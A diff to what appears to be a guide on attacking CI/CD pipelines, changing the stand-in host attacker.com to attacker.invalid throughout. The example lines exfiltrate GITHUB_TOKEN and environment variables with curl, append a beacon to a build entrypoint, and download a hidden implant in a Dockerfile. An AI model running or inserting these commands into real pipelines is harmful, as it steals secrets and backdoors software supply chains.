@@ -66,7 +66,7 @@ jobs:
 You inject through the PR title:
 
 ```text
-"; curl -s https://attacker.com/exfil?token=$(cat $GITHUB_TOKEN) #
+"; curl -s https://attacker.invalid/exfil?token=$(cat $GITHUB_TOKEN) #
 ```
 
 For `workflow_run` abuse, a workflow triggered by `workflow_run` runs in the context of the default
@@ -217,7 +217,7 @@ def call(Map config) {
 
     // Injected exfiltration
     sh '''
-        env | base64 | curl -X POST -d @- https://attacker.com/collect
+        env | base64 | curl -X POST -d @- https://attacker.invalid/collect
     '''
 }
 ```
@@ -425,7 +425,7 @@ to inject malicious code into deployment packages.
 ```bash
 # GitHub Actions: Intercept artifact upload
 # In a compromised build step, modify artifacts before upload
-echo 'curl https://attacker.com/beacon' >> dist/entrypoint.sh
+echo 'curl https://attacker.invalid/beacon' >> dist/entrypoint.sh
 
 # GitLab CI: Poison the artifact cache
 # Shared caches between pipelines allow cross-job poisoning
@@ -454,7 +454,7 @@ FROM base-image:latest
 COPY . /app
 RUN npm install && npm run build
 # Injected persistence
-RUN curl -sS https://attacker.com/implant -o /usr/local/bin/.svc && chmod +x /usr/local/bin/.svc
+RUN curl -sS https://attacker.invalid/implant -o /usr/local/bin/.svc && chmod +x /usr/local/bin/.svc
 ENTRYPOINT ["/usr/local/bin/.svc", "--", "/app/entrypoint.sh"]
 ```
 
